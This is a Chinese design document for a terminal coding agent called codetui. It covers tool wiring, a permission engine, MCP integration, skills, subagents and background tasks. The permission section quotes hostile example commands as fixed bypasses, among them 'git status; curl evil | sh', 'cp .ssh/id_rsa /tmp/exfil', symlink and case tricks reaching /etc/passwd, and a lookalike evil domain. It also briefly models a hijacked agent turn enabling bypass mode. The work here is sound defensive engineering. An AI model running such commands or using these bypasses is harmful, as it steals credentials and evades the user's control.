| `Bash` `BashOutput` `KillShell` | `ShellTools` *(lib)* | |
| `Grep` `Glob` | `GrepTool` / `GlobTool` *(lib)* | 绑 workingDirectory=root |
| `WebFetch` | `SmartWebFetchTool` *(lib)* | 接 aux client；`maxContentLength=150k`、`maxRetries=3` |
| `AskUserQuestionTool` | *(lib)* | questionHandler = `UserQuestionBridge` |
| `TodoWrite` | `TodoWriteToolAdapter`（自写） | 把库工具入参从 `Todos` 摊平成 `List<TodoItem>`；description 经 `RenamedToolCallback` 原样移植 |
| `Memory*`（6 个） | `AutoMemoryTools` *(lib)* | **仅主 agent**，目录 `<root>/.codetui/memory` |
| `BraveWebSearch` | 库 `BraveWebSearchTool` | 库版注册名是 `WebSearch`，与博查撞名，经 `RenamedToolCallback` 改名 + 换中文描述 + 套 `TimeLimitedToolCallback(20s)`；仅配 `BRAVE_API_KEY` 才注册 |
| `BochaWebSearch` | `BochaWebSearchTool`（自写） | 仅配 `BOCHA_API_KEY` 才注册 |
| `Skill` | `ReloadableSkillTool` 代理 → 库 `SkillsTool` | **始终注册**，零技能退化成空 delegate |
| `Task` `ParallelTasks` | `SubagentTool` | `ParallelTasks` 仅主 agent |
| `TaskOutput` `ListTasks` | `background.BackgroundTaskTool` / `BackgroundTaskListTool` | 仅主 agent |
| `ExitPlanMode` | `PlanApprovalBridge.exitPlanModeTool` | 仅主 agent |

组装形状：`rawTools` → `ToolCallbacks.from` → 追加 todo/skill/brave → 装饰循环 → `decorated[]` →
`toolsWithTask = decorated + memory + 5` → `.defaultTools(...)`。
**尾部 5 个下标是硬编码相对偏移**，加工具漏改下标不会编译失败，只会让某个工具静默变 null。

**MCP 工具刻意不进 `defaultTools`**：主 agent 每回合 `.tools(mcpRegistry.activeTools())` 快照注入，
子 agent 经 `SubagentRunner.effectiveTools` 拼接。子 agent 拿到的 `decoratedList` **不含**
记忆工具与上表标「仅主 agent」的 5 个，因此不能递归 fan-out。

### 8.2 装饰链

```
PermissionCallback( ToolEventCallback( MediaExternalizingCallback( 真实工具 ) ) )
```

| 层 | 职责 | 为什么在这个位置 |
| --- | --- | --- |
| `PermissionCallback` | `engine.decide(name, input)`；ALLOW 转发 / DENY 返回拒绝串 / ASK 阻塞等 UI | 放内层会让被拒的调用先发 `onToolStarted`，TUI 显示成「运行中」再变失败；审批等待期状态栏还挂着「工具运行中」 |
| `ToolEventCallback` | 发 started/finished；**把 turnId/taskId 压入 ThreadLocal** | 它是 `currentTurnId()` 的唯一来源。外层的 `PermissionCallback` 必须从 `ToolContext` 取 turnId，读 ThreadLocal 会拿到 -1 或上次残值 |
| `MediaExternalizingCallback` | 工具返回的非文本内容当场落 artifact 引用，字节永不进模型 | 装在事件层内层，保住 CURRENT_TURN 与身份判断不变 |

`Task` / `ParallelTasks` / `TaskOutput` / `ListTasks` / `ExitPlanMode` / 记忆工具**只包两层**
（返回值是纯文本，无媒体可外置）；包 `PermissionCallback` 是为了「所有工具走同一条链」，
虽然它们类别都是 INTERNAL 恒放行。

---

## 9. 权限层

### 9.1 判定顺序（`PermissionEngine.doDecide`）

`decide` 契约是**永不抛**：`catch RuntimeException` → `askOnly(...)`，失败关闭成 ASK
（不是 ALLOW 也不是 DENY）。

准备三件事：`ToolRegistry.lookup(toolName)` 取类别 → `ToolTargets.extract` 取判定目标
（路径目标必须 `normalize()`，不做等于 deny 规则形同虚设；只 normalize 不 `toRealPath`，
后者让「写尚不存在的文件」直接失败）→ COMMAND 类别才 `BashCommandSplitter.split`。

| # | 步骤 | 结论 | 跳过了什么 |
| --- | --- | --- | --- |
| 1 | deny 规则 | DENY | 跳过 2/4/5/6，全都更宽 → 安全 |
| ★ | BYPASS 直接放行 | ALLOW（仍跑一次底线检查，只作为「捎带的理由」留痕） | 核心不变量：**本档不产生任何 ASK** |
| 2 | 内置危险检查 `DangerousPaths` | `askOnly`，**刻意不给建议规则**（加任何 allow 都消不掉）。**PLAN 例外**：若 PLAN 本来就会拒则返回 DENY | 跳过 4（同为 ASK）/5/6 |
| 3 | *(预留插槽：工具自审)* | 本期无实现方，接口尚未定义（`PermissionEngine` / `PermissionBehavior` 注释里叫 `PermissionAware`） | — |
| 4 | ask 规则 | `askOnly` | 跳过 5、6 |
| 5 | allow 规则 | ALLOW | **唯一跳过了更严检查的地方**，靠下面两处不对称缓解 |
| 6 | 模式默认 `decideByMode` | 见 9.2 | PLAN 分支只放行只读与内部 |
| 7 | 兜底 | ASK + 建议 `工具名(*)` | — |

**两处刻意的不对称**（三个已实测的漏洞的支点）：

| 方向 | 命令分段 | 目标写法 |
| --- | --- | --- |
| deny / ask | 整串或**任一段**命中即命中 | 原写法 → `PathAliases` 解符号链接后写法 → 二者**小写形态**配「折叠孪生」规则，任一命中即命中 |
| allow | **必须每一段都命中**且 `parseable()`；例外是逐字相等的字面量规则 | **只认原写法配原规则一次匹配**（`foldedTwin` 对 ALLOW 返回 null） |

修的三个漏洞：`Bash(git status:*)` 曾放行 `git status; curl evil | sh`；
macOS APFS 大小写不敏感使 `deny Write(/etc/**)` 拦不住 `/ETC/passwd`；
`ln -s /etc x && Write x/passwd` 是两步符号链接绕过。

`separatorSensitive(entry)`：只有 COMMAND 与 UNKNOWN 保留 `hasShellSeparator` 守卫；
URL/query/bash_id 关掉——否则 `WebFetch(https://x/:*)` 会被 URL 查询串里的 `&` 打成「多段命令」。

### 9.2 四个权限模式

`PermissionMode.next()` 环：`DEFAULT → ACCEPT_EDITS → PLAN → BYPASS → DEFAULT`，**四档平权**，
BYPASS 也在 Shift+Tab 环上，不需要启动参数。

| 类别 | DEFAULT | ACCEPT_EDITS | PLAN | BYPASS |
| --- | --- | --- | --- | --- |
| INTERNAL / READ_ONLY | ALLOW | ALLOW | ALLOW | ALLOW |
| NETWORK_READ | ASK | ASK | ASK | ALLOW |
| FILE_WRITE | ASK | 工作区内 ALLOW，区外 ASK | **DENY** | ALLOW |
| COMMAND | 每段 `isReadOnly` 才 ALLOW | 额外放行「文件系统写 + 路径全在工作区内」的段 | 每段都只读才 ALLOW，否则 DENY | ALLOW |
| UNKNOWN（含全部 MCP） | ASK + 建议 `工具名(*)` | 同 | **DENY** | ALLOW |

几个必须记住的点：

- **PLAN 是 DENY 不是 ASK**——ASK 意味着用户能当场批准，那计划模式就名存实亡。拒绝串必须指路
  （当前档位 + 「改调 `ExitPlanMode`」+「不要重试本次操作」），否则模型把回合耗在重试上。
- **PLAN 下内置危险检查的特例**：不做的话 PLAN 下 `rm -rf ~` 是 ASK（可当场批准）而无害的
  `mvn test` 是 DENY，**结论倒置**。只读操作（读密钥）仍 `askOnly`——PLAN 承诺的是不动手，不是不读。
- **ACCEPT_EDITS 的命令段必须判工作区**：`isFileSystemWrite` 只看首词、完全不看目标在哪，
  不判则 `mkdir /etc/evil` 被放行**且理由写着「工作区内的文件操作」**。三条规则方向一律
  「拿不准就当区外」（`~` 开头判区外、通配符取字面前缀、其余按绝对/相对解析）。
- **BYPASS 的边界**：`deny` 规则仍生效（用户明令，且项目层文件是仓库带来的，clone 别人仓库时
  那些 deny 本来就是保护你的）；内置底线与 `ask` 规则一并舍弃——「一个名字带 dangerously 的开关，
  打开之后还在弹窗，那它就是在骗人」，且半无人值守时弹窗等于死锁（应答队列无超时）。

### 9.3 从判定到审批面板

`PermissionCallback.askThenAct`：

1. `ArrayBlockingQueue<PermissionOutcome>(1)` —— **每次调用新建，绝不复用**。实测共用的后果：
   `r1.cancel()` 的 CANCEL 被等在 `r2` 上的线程消费掉；迟到的 CANCEL 留在队列里被下一次调用读走，
   **杀掉用户刚刚批准的回合**。由此两条禁令：不得写重试循环读第二次、不得复用/重新武装 handoff。
2. `PermissionRequest` 紧凑构造器 `requireNonNull(responder)`——在构造期失败而不是排空期
   （队列 `[A,B]`，A 的 responder 为 null 会让 `cancelCurrent()` 排空循环抛 NPE 中断，
   **B 的工具线程永不被唤醒**）。
3. `asker.ask(...)` 抛异常 → **失败关闭成 DENY**（没送出去就没人应答，等下去必然永久 park）。
4. `handoff.take()` 无超时。`InterruptedException` → **重新置位中断标志**（take 清掉了它，
   不置位回去上层看不到取消）→ 抛 `PermissionCancelledException`。
5. 五种 `PermissionOutcome`：ALLOW_ONCE / ALLOW_SESSION / ALLOW_ALWAYS（后两者先 `remember`）/
   DENY / CANCEL。

**后台任务不弹面板**：判据只能是 `backgroundTaskId`（用 `taskId` 会让前台子 agent 的审批面板
静默消失），直接拒绝并按当前档位给三种不同理由（PLAN 下**刻意不提** `run_in_background=false`）。

**动态选项**是审批面板独有：`suggested == null` 时隐去「本会话不再问」「永久允许」两项
——askOnly 路径下加任何 allow 都消不掉下次询问，显示出来就是骗人。

**规则持久化** `remember`：SESSION → `addSessionRule`；PROJECT → **必须先问 `denyingRule`**
（被 deny 遮蔽与写盘失败是两回事，`addPersistentRule` 对两者都返回 false），两条提示都走
ERROR 级别（「用户以为记下了、其实没有」必须显眼）。

**建议规则生成** `suggest`：所有出口过 `roundTripped`（`toDsl()` 重新 parse 逐字段 equals，
不一致就返回 null——与其让用户点了「永久允许」什么都没发生，不如这里就不给）。
UNKNOWN → `工具名(*)`（**绝不**把整串入参写成 pattern，payload 每次都变 → 反复弹窗 → 用户
转去开 BYPASS）；COMMAND → 前缀规则或整串字面量；路径 → **必须 `escapeGlob`**
（`report[2026].md` 里的 `[2026]` 会被读成字符类）；URL → `origin + ":*"`，**结尾 `/` 不能省**
（否则会一并命中 `https://docs.spring.io.evil.com/`）。

`commandPrefix` 两条硬约束：**前缀不得停在非字母数字字符上**（否则 `Bash(cp .:*)` 命中
`cp .ssh/id_rsa /tmp/exfil`）；首词在 `NO_PREFIX_COMMANDS`（44 个解释器/启动器/破坏性命令）
或含 `=` 时一律不给前缀。`SUBCOMMAND_REQUIRED`（22 个）只拒绝塌成裸程序名的
（`Bash(mvn test:*)` 可以、`Bash(mvn:*)` 不行——整个拉黑会把审批疲劳推到「一律选 BYPASS」）。

### 9.4 规则 DSL 与 permissions.json

DSL `工具名(内容模式)`，三形态按此顺序判别：

| 形态 | 语义 |
| --- | --- |
| `工具名` / `工具名(*)` | 该工具全部调用（`pattern == null`） |
| `工具名(字面量:*)` | **前缀匹配**，`:` 之前按原样比较、不再解释通配符 |
| 其余 | `pathTarget` 为真按 **glob**（`*` 单层、`**` 递归），否则整串相等 |

`parse` 非法一律返回 null（含**空括号**——那是非法 DSL 而不是「全部」），调用方 WARN 跳过、绝不抛。
前缀词边界：停在字母数字/`_` 上须整串相等或后接空格（`ls` 不授权 `lsof`）；停在分隔符上可直接接续。
**不做空白归一**（`rm  -rf /` 双空格不命中 `Bash(rm -rf /:*)`），所以「DSL 的 deny 是尽力而为，
真正的护栏是 `DangerousPaths`」。

两层配置：`~/.codetui/permissions.json` + `<root>/.codetui/permissions.json`，
顶层只认 `defaultMode` / `allow` / `ask` / `deny`。**合并而非覆盖**，deny 只增不减。

**项目层只能收紧，不能放宽**（三条关闭路径，因为这个文件 **agent 自己写得到**、又跟着仓库走）：

1. `defaultMode` **两层皆不接受 BYPASS**——认了它就多出两条不经人手的入口（一次被劫持的回合写
   一行 JSON，或者 clone 一个仓库）。
2. **项目层 allow 不得通配放行**：`toolName=="*"` / `pattern==null` / 路径目标上的全盘 glob。
   第三条不枚举写法而是拿 `COVERAGE_CANARIES`（`/etc/passwd`、`~/.ssh/id_rsa`、
   `~/.aws/credentials`）**真跑一遍匹配**——「glob 的等价写法穷举不完，行为探测才穷举得完」。
3. 项目层 `defaultMode` 只能比用户层严（PLAN 3 > DEFAULT 2 > ACCEPT_EDITS 1 > BYPASS 0）。

**重复键按整文件非法**（`STRICT_DUPLICATE_DETECTION`）：Jackson 默认末键胜出，人读文件看到一条
deny 在生效、运行时它并不存在。**读写两侧必须开同一套开关**——只开读侧更糟（读侧判非法丢全部规则，
写侧按末键胜出读成「正常」树、追加后原样重写，被覆盖的 deny **从文件里真正消失**且返回 true）。

`PermissionConfigWriter` 共用纪律：JSON 非法 → 返回 null，**原文件一个字节都不动**；只动目标数组；
append 幂等；remove **倒着删**（正着删会让紧邻重复项前移到已扫过的下标上）；进程内静态锁串行化。
原子写必须 `copyPosixPermissions`——「写 tmp 再 move」会让新文件权限来自 umask，
一个特意 `chmod 600` 的 permissions.json 回写一次就变 `rw-r--r--`，
而**这个文件本身就是授权**，每次「允许，永久」都悄悄放宽一次它自己的权限，方向正好是反的。
append 侧独有 `roundTrips` 校验（remove 刻意不做——那道校验只对写入方向成立，
删除是收窄方向，要求往返一致只会让「恰好不能往返的规则永远删不掉」）。

### 9.5 内置底线 `DangerousPaths`

判据是**路径结构**（「路径里有没有名为 `.ssh` 的一段」）而非家目录前缀，理由三条：
macOS firmlink 使 `toRealPath()` 实测不收敛、`~` 刻意不展开、别人的家目录本也不该随便动。
**恒按大小写不敏感比较**；刻意**不做**「启动探一次文件系统敏感性」——探测判错会静默削弱这层
不可绕过的护栏。

写检查链：密钥文件名 → 敏感目录段（`.ssh/.aws/.kube/.gnupg/.docker/keychains`）→ `.git` →
嵌套敏感文件 → 自动执行文件 → `.github/workflows` → shell 配置 → 自动执行目录 →
`.codetui`（除 memory/sessions/artifacts）→ 裸设备 → **兜底白名单** `isOutsideWritableRoots`。
白名单而非黑名单是刻意的：`/etc/sudoers`、`/usr/local/bin/git` 按名列不全，
但「agent 干活该往哪写」可穷举。

读检查：系统密钥路径 → 密钥文件名 → 秘密目录 → `.ssh` 里**非公钥白名单**的文件
（不按 `id_` 前缀判——`ssh-keygen -f ~/.ssh/deploy` 生成的私钥就叫 `deploy`）→
`.npmrc`/`.gitconfig`（装 authToken）→ host key → 嵌套敏感文件。

命令检查 `checkCommand`：`parseable=false` 时改用 `lenientSplit` 宽松拆分并把整条原串也扫一遍
——「对拆分器而言 0 段是正确的失败关闭，但对本层不是：本层跑在 allow 与模式默认之前，
返回 null 等于放行」。`isOverBroadRoot`（root 是文件系统根、或家目录的严格祖先如 `/Users`）
时不拿它做豁免，启动时 `overBroadRootNotice` **必须打一行提示**——过宽时判定变严格，
不说明原因表现出来就是「这程序今天怎么老弹窗」，**静默变严格与静默失效同样糟**。

`BashCommandSplitter` 的「拆不动就问」：不可拆分构造（`$( `` <( >( ${`）、引号内出现分隔符、
引号不配对 → `parseable=false`。**分隔符清单与不可拆分构造清单各只有一份**
（曾各存一份并已漂移出 `${` 一处分歧，有一致性测试钉着）。漂移方向是固定的：
更严格的组件跑在决策顺序更后面，于是永远轮不到它。

白名单是「首词能不能定性整段」而非「这个程序平时危不危险」：`find`/`rg`/`env`/`file` 因有逃逸口
不收；`git branch`/`git remote` 整个移出只读集（实测三种绕过）。`pathArguments` 对 `--opt=value`
取 `=` 之后那半（同一动作两种拼法，只拦住一种等于没拦）。

---

## 10. MCP

`McpRegistry.init(root, listener, permissionEngine)` → `McpConfigLoader` → `McpTransportFactory`
→ `McpClientManager`；运行期启停回写走 `McpConfigWriter`。

### 10.1 配置到工具可用

1. `McpConfigLoader.loadAll(root)` 读两层 `mcp.json`（项目级同名项覆盖用户级，**连来源层与回写
   目标一并换成项目级**）。`load` 与 `loadAll` 唯一差别：后者**保留 `enabled:false`** 供 `/mcp` 列出。
   - `type` 省略即 `stdio`；`http` 与 `streamable-http` 两种拼写都认；`sse` 与未知 type WARN 跳过。
   - `url` 必须过 `isAbsoluteHttpUrl`——**不能只靠 `URI.create` 抛异常**（`URI.create("foo")`
     并不抛，拿去构造 transport 会在连接期才炸出难懂的错）。
   - headers 值经 `EnvInterpolator`，**引用了未定义变量 → 整条 server 跳过**
     （带着 `${X}` 去请求只会换来一个看不懂的 401）。
2. `McpTransportFactory.create` 是**加新传输的唯一分型点**。HTTP 必须把 baseUri 与 endpoint
   **拆成两段**：把整个 `https://h/mcp` 当 baseUri 传，SDK 会再拼一个默认 `/mcp`，
   实际请求打到 `/mcp/mcp`。`headerCustomizer` 抽成独立方法是为了**能单测**——真机冒烟证明不了它：
   实测 Context7 在 initialize 阶段不校验 API key，headers 全丢它照样返回 200。
3. `McpClientManager.connectDetailed`：**server 逻辑名塞进 clientInfo 的 title**，
   `discoverTools` 再读回来作前缀。工具名 `mcp__<server>__<tool>`。
   `listTools` 失败只 WARN + 返回空表（逐 client guard，刻意不用 `SyncMcpToolCallbackProvider`
   的聚合 flatMap，它一处失败会带崩全部）。每个 server 只建**一个**共享 `McpSyncClient`
   （JSON-RPC id 多路复用，故并行子 agent 同时调同一 server 安全）。
4. `McpRegistry.decorate(raw)` 与内置工具**完全同构**的三层链。构造器
   `requireNonNull(permissionEngine, "漏传等于 MCP 工具全线无权限层")`。运行期 `/mcp` 启用的
   server 也走这里，故权限层**不能**改成「装配期一次性包装」。

MCP 工具在 `ToolRegistry` 里**永远是 UNKNOWN**，判定目标是整串入参 → 模式默认落兜底 ASK
（PLAN 下 DENY），建议规则只给 `工具名(*)`。

### 10.2 启动期后台并行连接

`connectEnabledInParallel`：`min(n,8)` daemon 线程池、`runAsync` **刻意不 join**、`init` 立即返回。
可以不等的依据是主 agent 每回合重新快照 `activeTools()`；而等它连完的代价是实测的
（一个远程 server 5~8 秒，那几秒屏幕是空的）。

`publishStartupResult` 是唯一发布点，**两道丢弃检查都在 `synchronized(this)` 内**：
`closed` 为真 → 当场 `closeQuietly` 不写回（不查就是漏孤儿子进程）；`!e.enabled` → 用户在连接
在飞期间禁用了它，写回等于把禁用悄悄复活。这里靠「写回时复查意图」而**不是**去争 `toggleLock`
（那会让 `/mcp` 面板操作卡好几秒）。无论走哪条路 `connecting` 都递减，归零时回调 `onMcpReady`。

### 10.3 运行期启停

**锁序：`toggleLock` 外、`this` 内。** 连接（秒级阻塞）留在 `this` 锁外，不挡 `servers()` 读。

- `enable`：连接 → 回写 `enabled:true`（**连接失败也回写**，用户意图是启用，下次启动自动重试）。
- `disable`：`this` 内摘 client/tools/enabled（下回合快照即不含）→ 锁外起 daemon 线程优雅关 → 回写。
- `servers()` 的状态判定**顺序要紧**：`connecting` 必须排在 FAILED 之前，
  否则启动头几秒会一律显示成「连接失败」——那是在报一个还没发生的错。
- `close()`：**`closed` 必须先置位、再收集**——反过来会留一个窗口，那一瞬间连上的 client
  既不在收集名单里、又因 closed 未置位而被写进 entry，成了孤儿子进程。
  `closeAll` 总预算 **2000ms 硬限**，到点就走（「不卡退出」优先于「保证优雅清理」）。

`McpConfigWriter` 与 `PermissionConfigWriter` 的三点差异：tmp 文件名固定 `.tmp`（无随机后缀）、
无静态锁、无 `copyPosixPermissions`。

---

## 11. 技能

`ReloadableSkillTool`（工具名 `Skill`）→ `SkillCatalog` → 库 `SkillsTool`。

**发现**：两层 `~/.codetui/skills/` → `<root>/.codetui/skills/`，**后者覆盖同名**。
每层直接调 `Skills.loadDirectory(层目录)`（已核实 `loadResource` 会对每个 Resource 调 `getFile()`
当**目录**遍历，它期望技能根目录而非单个 `SKILL.md`）。格式 `<层>/<技能名>/SKILL.md`，
frontmatter 至少 name + description。目录不存在的层静默跳过；某层抛异常只跳过该层。
**刻意无内置层**——技能应由使用者放文件即安装。

**注入两条路**：自动路是 `Skill` 工具**描述**里的 `<available_skills>` 清单（系统提示只有一句
「动手前先看 Skill 工具描述里的清单」）；手动路 `/skill` 由 `CodingAgent.injectSkill` 在发送**前**
真调那个被 `ToolEventCallback` 装饰过的**同一个实例**（使事件与返回值和自动路径一致），
拼成 `<skill_instruction>正文</skill_instruction>\n\n原文`。任一环节失败降级为不注入、不阻断本轮。

**热重载**：`ReloadableSkillTool` 是**实例恒定、内部可换**的代理。可行依据是 Spring AI 的
`DefaultToolCallingManager.resolveToolDefinitions` **每次请求**都逐个现调 `getToolDefinition()`
——所以 `reload()` 后下一次请求就看到新清单，不必重建任何 `ChatClient`。
用 `volatile Snapshot(infos, delegate)` **整体原子替换**，读侧永不看到「新列表 + 旧 delegate」。

**始终注册、支持从零**：`SkillsTool.build()` 零技能会抛 `At least one skill must be configured`，
而不注册的话 `/reload` 就永远加载不出「第一个」技能，所以零技能时退化成 `emptyDelegate()`
（名仍为 `Skill`，清单写「(当前无可用技能)」，调用返回提示告诉用户往哪放文件）。
代价是零技能时上下文多一个空工具。

`skills()` 也走可重载源实时取，所以 `/skills` 面板与模型看到的是同一份。
`reloadableSkill` 进了 `decoratedList`，因此**子 agent 也能用 `Skill`**。

---

## 12. 子 agent

工具 `Task` / `ParallelTasks`（`SubagentTool`）→ `SubagentRunner` → `SubagentLoader` / `SubagentSpec`。

**定义加载**：`SubagentLoader.loadBuiltins()` 读 4 个 classpath 资源
`/agents/{general-purpose,explore,plan,bash}.md`，用库 `MarkdownParser` 解 frontmatter
（`name` / `description` / `tools`→allow / `disallowedTools`→deny / `model` / `skills`）+ 正文→systemPrompt。
**不支持用户自定义子 agent**（无代码扫描 `.codetui/agents/`；`parse(uri)` 支持 `file:` 但无调用方）。

内置四个的工具约束：`general-purpose` 只 deny `AskUserQuestionTool`；
`explore` / `plan` allow `Read, Grep, Glob`；`bash` allow `Bash, BashOutput, KillShell`。

**工具集隔离**：`effectiveTools(spec)` = `decoratedList` + `mcpRegistry.activeTools()`（每次委派现取，
`/mcp` 启停下一次委派即生效）→ `filterTools`（allow 为空视为全部，再 deny 剔除，**按注册名精确匹配**）。

**系统提示**每次派发现拼：`spec.systemPrompt()` + `AGENTS.md` 项目指令 +
`PermissionModePrompt.forSubagent(modeSupplier.get())`（仅 PLAN 非空）+ 恒定 `ARTIFACT_GUIDANCE`。
`modeSupplier` 是 `permissionEngine::mode`，**刻意用 Supplier 而非值**，Shift+Tab 切档下一次委派生效。

**模型路由** `resolveSelection`：`spec.model()` 空则用当前激活；非空则**只在当前 provider 上**
按模型名覆盖（跨家路由是未做项）。

**两个不同的「桥」别混**：

| 桥 | 类 | 做什么 |
| --- | --- | --- |
| 传输桥 | `RetryingChatModel` | 把阻塞 `call` 桥成 `stream` + `MessageAggregator` 聚合（代理网关非流式端点有分钟级坏窗口）。5 次尝试、500ms 指数退避封顶 4s，瞬态判据与红线见 [ADR](adr/subagent-streaming-bridge.md#7-参数与判据)。**必须转发 `getOptions()`**，漏了会导致 options 不是 `ToolCallingChatOptions` → `ToolCallingAdvisor` 整个跳过 → 子 agent 静默丢全部工具 |
| UI 事件桥 | `toolContext` 携 `turnId=parentTurnId` + `taskId` | 由 `ToolEventCallback` 读出上报，TUI 据 taskId 缩进。**子 agent 的 assistant token 不回传**，回主 agent 的只有最终文本 |

不挂 `SessionMemory` advisor → 子 agent 上下文独立。失败时 `describe(ex)` 把 cause 链摊平
（去相邻重复、封顶 5 层）包成 `SubagentFailedException`——工具异常处理器只把 `getMessage()` 交回
模型，而 SDK 顶层 message 往往笼统。

**并行 `runAll`**：**回合级局部**线程池，容量 `min(N, CODETUI_SUBAGENT_CONCURRENCY)`（默认 4，钳 [1,32]），
`invokeAll` 后 `finally` 立即 `shutdownNow`。结果按**入参顺序**返回，单条失败在该位置返回
`失败：<msg>`。`parentTurnId` **显式传入闭包**，子线程绝不读 ThreadLocal。

池按 turn 注册进 `poolsByTurn`（一个回合可多次 `ParallelTasks`，故是 `Set`）。
`cancelTurn(turnId)` 逐个 `shutdownNow`、**立即返回不 awaitTermination**，与 Reactor 的
`Disposable` 组合成复合 Disposable，Esc 一次同时拆两边。串行 `run()` 无池、**无法强制打断**，
靠出站净化 + busy 闸门兜底。

**在飞计数刻意分两个**：`inFlight`（前台，喂 UI busy 闸门）与 `backgroundInFlight`
（后台，只供面板与退出清理）。混在一起就会「只要有后台任务在跑就挡住新回合」= 后台化白做。

`SubagentTool.batchFunction` 的失败隔离与单任务**有意不同**：单任务遇未知 type **抛异常**，
批量则把该条降级成失败文本、不抛。

> `SubagentSpec.skills` 被解析但**当前无消费方**（`effectiveSystemPrompt` 没读它），是为
> 「按 spec 预挂载技能」预留的字段；子 agent 现有的技能能力来自工具集里的 `Skill`
> 工具（模型按需自调用）。已在 `SubagentSpec` javadoc 上标注，含实现该功能的入手点。

---

## 13. 后台任务

`SubagentTool`(run_in_background) / `TaskOutput` / `ListTasks` → `background/` 包 7 个类。

**派发** `SubagentRunner.runInBackground`（**绝不抛异常**）：快照 `backgroundPool`（不重读 volatile，
否则拒绝理由会说反）→ `backgroundClosed` 时**连 register 都不做**（不登记就不会留下停在 RUNNING
的幽灵条目）→ `register` 拿 taskId → 发 started → `pool.execute`。
`RejectedExecutionException` 时：递减计数、`kill(taskId)` 标 **KILLED**（不是 FAILED——KILLED
不可送达，绝不会被自动送给模型，因为它根本没跑）、按 `isShutdown()` 区分「池已关」与「队列已满」
两句话、**补发 finished**（不补则 UI 那条永远停在 RUNNING）。
UI 记 FAILED 与注册表记 KILLED 刻意不一致：前者给人看，后者给模型。

**执行体**：`toolContext` 传 `turnId=-1L`（无归属回合，塞真 turnId 会被迟到过滤丢弃）+ `taskId`
+ **`backgroundTaskId`**（权限层判「是否后台」的唯一判据，见 [9.3](#93-从判定到审批面板)）。
catch `Throwable`（Error 也兜，否则池线程静默死亡、任务永停 RUNNING）。

**状态机** `BackgroundTask`：`RUNNING → DONE | FAILED | KILLED`，`deliverable() = DONE || FAILED`。
刻意是可变类而非 record，刻意不记时间（耗时由 UI 镜像承载，避免第二个真相源）。
`BackgroundTaskRegistry` 全部方法 `synchronized`，容量 64，淘汰按登记序找**第一个已结束**的，
**运行中永不淘汰**；**不落盘、不跨进程**。`markConsumed` 的返回值是两条取回路径的**互斥闸**。

**三个终止语义严格分开**：

| 方法 | 场景 | 做法 |
| --- | --- | --- |
| `restartBackground()` | `/clear` | **先换新池再 shutdownNow 旧池**，清 `backgroundClosed`，不 await。只关不建会让此后每次派发永久落进 rejected，而模型读到「等在跑的任务完成后重试」就会永远等 |
| `shutdownBackground()` | `/exit` | 先置 `backgroundClosed` 再 `shutdownNow` + `awaitTermination(2s)` |
| — | — | `CodeTuiView` 退出时**只**调 `shutdownBackground`，绝不先调 `killAll`（否则 await 等在一个空池上 0ms 返回） |

**结果取回两条路，互斥**：

- **`TaskOutput` 工具**：`block=true` 时轮询 200ms，上限 `CODETUI_TASK_OUTPUT_TIMEOUT_SECONDS`
  默认 300 钳 [1,3600]，超时返回「仍在运行」而非失败。**有未送达插话就提前收工**
  （`interjectionPending` 是必填构造参数）——这一等跑在主 agent 工具线程上，
  期间不发模型调用，而模型调用是插话唯一送达点，不让路则「后台」二字被 `block=true` 抵消。
  查无此 id 时**三件事都说**（可能来自已结束进程、可能是被淘汰的已结束记录、外加当前清单）。
- **空闲自动送达**：`CodeTuiView.deliverBackgroundResults()` 在每个空闲 UI 批里调，
  **先判闸门再取列表**（取列表会顺手落盘）。**submit 抛异常时不标记已消费**
  （标记就等于丢结果），下一批重试。

**失控刹车** `BackgroundNotifier`：连续自动回合 ≤ `DEFAULT_MAX_CONSECUTIVE=3`，
任何真实用户输入归零（挂在**提交**上而非按键上，挂按键则一个方向键就松开刹车）。
三个前置条件都在 `consecutive++` **之前**，否则空转批几秒就把额度耗光。
多任务**合并成一条**通知。

**限幅** `TaskResultStore`：`completedBackgroundTasks()` 是后台结果进入会话的**唯一入口**，
限幅放这里绕不过去。超 `DEFAULT_MAX_CHARS=4000` 则完整正文落 `.codetui/artifacts/task-<id>.txt`
+ 返回前 4000 字 + 路径说明。**落盘失败不抛**，降级纯截断并如实说明「截断之外的内容已丢失」——
给一个取不回的路径比不给更糟。

**措辞单一出处** `BackgroundDigest`：`/continue` 注入、`ListTasks`、`TaskOutput` 查无此 id 三条路共用。
`forContinue` 只列会造成重复劳动的两格（RUNNING、DONE 未消费），FAILED/KILLED 一个字不提
（`/continue` 本意就是把没做完的接着做，重派正是想要的结果）。空快照返回**自条件句**
（「若你在历史里看到过…」）——`-c` 恢复后注册表必然是空的而历史里还留着 taskId。

`ListTasks` 存在的理由：`/compact` 会把 `Task` 返回值里的 id 压掉，此后模型再也查不了自己派了什么。

---

## 14. 回合中插话

链路：`CodeTuiView.submissionRoute` → `onSubmit.interject(text)` → `Interjections.offer` →
`InterjectingChatModel.inject(prompt)` 在**下一次模型调用**时 `drainForInjection` →
追加一条 `UserMessage(InterjectionText.wrap(raw))` → 锁外 `fireDelivered(原文)` →
转成 `listener.onUserMessage` 打进 scrollback。

**路由三态**由**一次原子快照** `submissionSnapshot()` 决定：非忙且无在飞子 agent → `DISPATCH`；
有活跃回合且无技能挂载 → `INTERJECT`；否则 → `QUEUE`。每个条件都有理由：压缩中、以及回合已被
Esc 取消只剩子 agent 收尾（state 已 IDLE 但 busy 仍 true）都不会再调模型，插话进去会一直躺着；
带技能挂载的不能插话（插话是纯 `UserMessage` 带不了第二参数会静默丢技能）。
**快照必须一次取**，否则回合恰在两次读取之间结束会把同一次 Enter 错误路由。

**为什么挂在 ChatModel 层**：唯一合法插入位置是「所有 tool 结果之后」，落在
`assistant(tool_calls)` 与 `tool` 之间就是悬空 tool_calls、下次请求直接 400；
而只有这一层拿到的 `Prompt` 是已配平的完整消息表。

**可见性设计**：输入那一刻**刻意什么都不往 scrollback 打**（scrollback 的行改不了、位置会永远
停在错的地方），未送达期间的存在感全靠输入框上方的面板（读**非破坏性**快照
`pendingInterjectionTexts()`——接到 `takePendingInterjections()` 上会把队列在 render 里清空）+ 状态栏计数。

`InterjectionText` 把 wrap/unwrap 放在同一个类里，因为 `-c` 回放曾把「给模型的行为指引」
当成用户原话显示出来。

**回合末兜底**：UI 批空闲分支里 `takePendingInterjections()`（只取未送达的）排在 `pollQueued`
**之前** dispatch——已送达那条归 `handleComplete` 补历史，抢走会让同一句话发两遍。

**Esc 取回**：`drainForRefill` 取回**全部**（含已送达的）回填输入框。理由是取消走 `doOnCancel`，
`handleComplete` 不跑、没人补历史，不还给用户就是模型看过、历史没有、用户也拿不回来。

---

## 15. 计划模式

